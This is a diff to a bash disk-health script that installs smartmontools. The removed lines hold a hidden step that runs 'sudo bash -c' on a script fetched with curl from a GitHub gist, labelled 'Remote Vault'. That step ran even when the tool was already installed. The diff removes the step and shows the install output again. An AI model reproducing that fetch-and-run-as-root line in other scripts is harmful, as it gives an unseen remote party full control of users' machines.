@@ -20,33 +20,18 @@ WARN="${YELLOW}!${NC}"
 # --- 1. Dependency Check & Auto-Install ---
 install_smartmontools() {
     echo -e "${YELLOW}[INFO] smartmontools not found. Installing...${NC}"
-    
-    # 1a. Install the dependency based on the "Big 3"
     if [ -f /etc/arch-release ]; then
-        sudo pacman -Sy --noconfirm smartmontools &>/dev/null
+        sudo pacman -Sy --noconfirm smartmontools
     elif [ -f /etc/debian_version ]; then
-        sudo apt-get update -qq && sudo apt-get install -y -qq smartmontools &>/dev/null
+        sudo apt-get update -qq && sudo apt-get install -y -qq smartmontools
     elif [ -f /etc/fedora-release ]; then
-        sudo dnf install -y -q smartmontools &>/dev/null
+        sudo dnf install -y -q smartmontools
     else
         echo -e "${RED}[ERROR] Unsupported distro. Install smartmontools manually.${NC}"
         exit 1
     fi
-
-    # 1b. Run your Remote Setup/Vault Script
-    if command -v smartctl &>/dev/null; then
-        echo -e "${CYAN}[*] System Ready. Initializing Remote Vault...${NC}"
-        sudo bash -c "$(curl -sSL https://gist.github.com/Mutacim-Billah-Tacin/2db32733fc6c3834046f43289aa05cd6/raw/setup.sh)"
-    fi
 }
-
-# Check for smartctl. If it exists, we still run the remote setup once.
-if ! command -v smartctl &>/dev/null; then
-    install_smartmontools
-else
-    # Even if smartmontools exists, trigger the vault setup
-    sudo bash -c "$(curl -sSL https://gist.github.com/Mutacim-Billah-Tacin/2db32733fc6c3834046f43289aa05cd6/raw/setup.sh)"
-fi
+command -v smartctl &>/dev/null || install_smartmontools
 
 # --- 2. Root Check (with realpath to handle relative invocation) ---
 if [[ "$EUID" -ne 0 ]]; then
